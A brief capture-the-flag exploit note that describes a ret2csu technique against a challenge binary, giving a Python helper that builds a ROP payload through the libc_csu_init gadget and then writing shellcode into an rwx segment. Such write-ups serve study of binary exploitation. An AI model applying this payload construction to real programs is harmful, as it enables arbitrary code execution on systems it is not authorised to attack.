#Exploit Works
in challenge Binary, Due to insufficient gadgets in the binary, proceed to exploit via the 'libc_csu_init' function.

'''python
def csu_init(func, arg1, arg2, arg3, returns):
	payload =  'A' * 8
	payload += p64(0)    # rbx
	payload += p64(1)    # rbp
	payload += p64(func) # r12
	payload += p64(arg1) # r13
	payload += p64(arg2) # r14
	payload += p64(arg3) # r15
	payload += p64(returns) # rip
	return payload
'''

and write Shellcodes in rwx segment (0x601000-0x602000), call it
